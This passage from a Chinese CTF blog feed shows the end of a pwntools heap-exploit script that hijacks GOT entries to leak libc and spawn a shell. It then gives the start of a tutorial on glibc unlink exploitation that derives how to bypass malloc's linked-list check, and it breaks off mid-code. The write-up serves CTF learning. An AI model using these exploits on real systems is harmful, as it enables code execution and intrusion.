class=\"token comment\">#allocate(0x10)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\">#allocate(0x80)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>payload1<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>P<span class=\"token operator\">-</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>P<span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>payload1<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token comment\">#gdb.attach(p)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"OK\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>payload2<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>free_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>atoi_got<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>payload3<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload3<span class=\"token punctuation\">)</span> <span class=\"token comment\">#改变 free_got 功能为 puts</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#相当于执行 puts (puts_got)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token comment\">#p.recvuntil(\"OK\\n\")</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>puts<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"OK\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>libc_base<span class=\"token operator\">=</span>puts<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>system<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>binsh<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b\"/bin/sh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"system:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"binsh:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>payload4<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span> <span class=\"token comment\"># 将 free 改为 system</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload4<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>payload5<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"77\"></td><td><pre></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload5<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token comment\">#gdb.attach(p)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token comment\">#pause()</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/10/04/pPO5goj.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/10/02/pwn/%E4%B8%93%E6%A0%8F/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bunlink/",
            "url": "https://vvwwvv.cn/2023/10/02/pwn/%E4%B8%93%E6%A0%8F/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bunlink/",
            "title": "堆利用之unlink（例题：hitcon2014_stkof）",
            "date_published": "2023-10-02T06:15:56.000Z",
            "content_html": "<p>libc 源码下载：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2Z0cC5nbnUub3JnL2dudS9nbGliYy8=\">http://ftp.gnu.org/gnu/glibc/</span></p>\n<h1 id=\"1unlink\"><a class=\"anchor\" href=\"#1unlink\">#</a> 1.Unlink</h1>\n<p>这里参考了博客：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ob2xsay5ibG9nLmNzZG4ubmV0L2FydGljbGUvZGV0YWlscy8xMDg0ODE4ODk/c3BtPTEwMDEuMjAxNC4zMDAxLjU1MDI=\">https://hollk.blog.csdn.net/article/details/108481889?spm=1001.2014.3001.5502</span></p>\n<p><code>unlink</code>  是一个宏，定义在 malloc.c 里</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">unlink</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>AV<span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> BK<span class=\"token punctuation\">,</span> FD<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>                                            </span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    FD <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    BK <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">!=</span> P <span class=\"token operator\">||</span> BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\t\t      </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span>check_action<span class=\"token punctuation\">,</span> <span class=\"token string\">\"corrupted double-linked list\"</span><span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> AV<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> BK<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_smallbin_range</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>size<span class=\"token punctuation\">)</span>\t\t\t\t      </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\t\t      </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\t      </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token operator\">||</span> <span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>    </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t      <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span>check_action<span class=\"token punctuation\">,</span>\t\t\t\t      </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t       <span class=\"token string\">\"corrupted double-linked list (not small)\"</span><span class=\"token punctuation\">,</span>    </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t       P<span class=\"token punctuation\">,</span> AV<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t      </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">==</span> P<span class=\"token punctuation\">)</span>\t\t\t\t      </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                  FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> FD<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t      </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                    FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token punctuation\">;</span>\t\t\t      </pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                    FD<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span>\t\t\t      </pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                    P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t\t      </pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                    P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t\t      </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                  <span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>              <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span>\t\t      </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token punctuation\">;</span>\t\t      </pre></td></tr><tr><td data-num=\"28\"></td><td><pre>              <span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"29\"></td><td><pre>          <span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>unlink</code>  是在进行 <code>free</code>  操作时执行的，看上面的源码知道是对 <code>链表</code> 的操作，这里是修改指针的效果（unlink <code>目的</code> 就是将一个空闲块 (在链表中) 拿出来，例如 free 时和目前物理相邻的 free chunk 进行合并），我的理解是 <code>unlink</code>  是将空闲的块在有新释放的块满足条件要合并时进行的操作，因为想要合并，就需要先将空闲的块从链表里取下来， <code>unlink</code>  就是在进行这个取下来的操作</p>\n<p>执行 <code>unlink</code>  的函数（在 <code>free函数</code> 执行了 <code>int_free()函数</code> ，其中调用了 <code>unlink</code>  宏）</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">unlink</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>AV<span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> BK<span class=\"token punctuation\">,</span> FD<span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">_int_free</span> <span class=\"token punctuation\">(</span>mstate av<span class=\"token punctuation\">,</span> mchunkptr p<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> have_lock<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">_int_free</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>ctfwiki 上的图片：<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/02/pPLyMQA.png\" alt=\"\" /><br />\n这里就能发现是将中间的 <code>P</code>  给取了出来，修改了 <code>BK</code>  和 <code>FD</code>  的指针</p>\n<p>图里面的执行顺序为：</p>\n<ol>\n<li>P-&gt;fd=FD</li>\n<li>P-&gt;bk=BK</li>\n<li>FD-&gt;bk=BK</li>\n<li>BK-&gt;fd=FD</li>\n</ol>\n<p>上面的释放顺序为：</p>\n<ol>\n<li>\n<p>free(FD)</p>\n</li>\n<li>\n<p>free(P)</p>\n</li>\n<li>\n<p>free(BK)</p>\n<p>所以在 bin 中为： <code>BK-&gt;P&gt;FD </code>   的顺序</p>\n</li>\n</ol>\n<h1 id=\"2unlink检查机制\"><a class=\"anchor\" href=\"#2unlink检查机制\">#</a> 2.unlink 检查机制</h1>\n<p>由于 unlink 是在 free 函数中调用的，所以只需要检查 chunk 是否为空闲</p>\n<p>其检查机制有三个：</p>\n<ol>\n<li>检查被释放的 <code>chunk</code>  的 <code>size</code>  的值是否与相邻高地址的 <code>chunk</code>  的 <code>pre_size</code>  的大小相同（这里忽略 <code>p</code>  标志位， <code>p标志位</code> 为 size 最低位）【一个块为空闲时，相邻高地址块的 <code>pre_size</code>  为前一个块的大小（=size）】</li>\n<li>检查被释放 chunk 与相邻高地址的 <code>chunk</code>  的 <code>size</code>  的 <code>P标志位</code> 是否为 0， <code>p为0则表示前一个chunk空闲</code></li>\n<li>检查前后被释放 chunk 的 fd 和 bk</li>\n</ol>\n<h1 id=\"3unlink绕过\"><a class=\"anchor\" href=\"#3unlink绕过\">#</a> 3.unlink 绕过</h1>\n<p>我们想要利用 unlink，就需要绕过其检查，而上面的三个检查机制里前面两个通过溢出直接修改即可，后面的则需要我们进行一番操作</p>\n<h2 id=\"1关键检查\"><a class=\"anchor\" href=\"#1关键检查\">#</a> 1. 关键检查：</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">!=</span> P <span class=\"token operator\">||</span> BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>            </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"corrupted double-linked list\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>上面的是检查在 <code>空闲的链表</code> 中前后释放的 <code>chunk的指针</code> 是否对应正确</p>\n<h2 id=\"2绕过\"><a class=\"anchor\" href=\"#2绕过\">#</a> 2. 绕过</h2>\n<p>下面的图里我们可以看到空闲链表的结构：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/03/pPOVsYj.png\" alt=\"\" /></p>\n<p>这里我们可以知道各个指针指向的位置：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>P<span class=\"token operator\">-></span>fd<span class=\"token operator\">=</span>FD</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>P<span class=\"token operator\">-></span>bk<span class=\"token operator\">=</span>BK</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>FD<span class=\"token operator\">-></span>bk<span class=\"token operator\">=</span>P   <span class=\"token comment\">// 关键检查</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>BK<span class=\"token operator\">-></span>fd<span class=\"token operator\">=</span>P    <span class=\"token comment\">// 关键检查</span></pre></td></tr></table></figure><p>1. 这里我们知道 <code>FD</code>  从 <code>pre_size</code>  位到 <code>bk</code>  位需要 <code>0x18</code>  个大小（32 位是 12 个），也就是说 <code>&amp;FD+0x18=&amp;bk</code> , 而 <code>P-&gt;fd=FD</code>  并且 <code>FD的bk</code>  的值为 P 的地址，所以 <code>P-&gt;fd-&gt;bk=P&lt;=&gt;*(P-&gt;fd+0x18)=P</code></p>\n<p>这里 <code>*(P-&gt;fd+0x18)=P</code> <mark>&gt;P-&gt;fd+0x18=&amp;P</mark>&gt; <code>P-&gt;fd=&amp;P-0X18</code></p>\n<p>2. 同理知道 BK 的 <code>pre_size</code>  位到 <code>fd</code>  位需要 <code>0x10</code>  个大小（32 位是 8 个），即 <code>&amp;BK+0X10=&amp;fd</code> ，而 P-&gt;bk=BK 并且 BK 的 fd 的值为 P，所以 <code>P-&gt;bk-&gt;fd=P&lt;=&gt; *(P-&gt;bk+0x10)=P</code></p>\n<p>这里 <code>*(P-&gt;bk+0x10)=P</code> <mark>&gt;P-&gt;bk+0x10=&amp;P</mark>&gt; <code>P-&gt;bk=&amp;P-0X10</code></p>\n<p>也就是说我们最终通过：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>P<span class=\"token operator\">-></span>fd<span class=\"token operator\">-></span>bk <span class=\"token operator\">==</span> P <span class=\"token operator\">&lt;=</span><span class=\"token operator\">></span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd <span class=\"token operator\">+</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> P </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p<span class=\"token operator\">-></span>bk<span class=\"token operator\">-></span>fd <span class=\"token operator\">==</span> P <span class=\"token operator\">&lt;=</span><span class=\"token operator\">></span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-></span>bk <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> P</pre></td></tr></table></figure><p>得到了：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>P<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>P <span class=\"token operator\">-</span> <span class=\"token number\">0x18</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>P<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>P <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span></pre></td></tr></table></figure><p><strong>这意味着当我们的 P 中的 <code>fd=&amp;P - 0x18 </code>  , <code>bk=&amp;P - 0x10</code>  就能绕过检查 (这里是将 fd 的 <code>内容</code>  设置为 (&amp;p-0x18)，将 bk 的 <code>内容</code> 设置为 (&amp;p-0x10) )</strong></p>\n<h2 id=\"3不同链表的unlinkfd_nextchunk和bk_prechunk分别为了方便在large-bins中快速地管理chunk块\"><a class=\"anchor\" href=\"#3不同链表的unlinkfd_nextchunk和bk_prechunk分别为了方便在large-bins中快速地管理chunk块\">#</a> 3. 不同链表的 unlink（fd_nextchunk 和 bk_prechunk 分别为了方便在 large bins 中快速地管理 chunk 块）</h2>\n<p>因为 P 的脱链操作只能在 <code>smallbin</code>  和 <code>largebin</code>  中（无法在 fastbin 中）进行，而这两个 bin 都是 <code>双向链表</code> ，所以我们必须修改 <code>前后</code>  chunk 的 fd 和 bk 指针</p>\n<p>上面已经得出了结论，这里有别人更详细的推导：<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNTU3ODcy\">https://cloud.tencent.com/developer/article/1557872</span></p>\n<h3 id=\"对于smallbin来说\"><a class=\"anchor\" href=\"#对于smallbin来说\">#</a> 对于 smallbin 来说：</h3>\n<p><code>smallbin</code>  通过上面的方式直接就可以完成脱链，因为 smallbin 中的 chunk 的  <code>fd_nextsize</code>  和  <code>bk_nextsize</code>  是没有意义的</p>\n<h3 id=\"对于largebin来说\"><a class=\"anchor\" href=\"#对于largebin来说\">#</a> 对于 largebin 来说：</h3>\n<p>对于 smallbin 来说，脱链操作上面就已经完成了，但是对于 largebin 来说，还有未完成的工作，因为 largebin 中还有 fdnextsize 以及 bknextsize 指针需要修改。</p>\n<p>在 largebin 中，也只有在相同尺寸的同一组 chunks 中的第一个 chunk 中  <code>fd_nextsize</code>  以及  <code>bk_nextsize</code>  才有意义。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_smallbin_range</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>size<span class=\"token punctuation\">)</span>                \\</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token 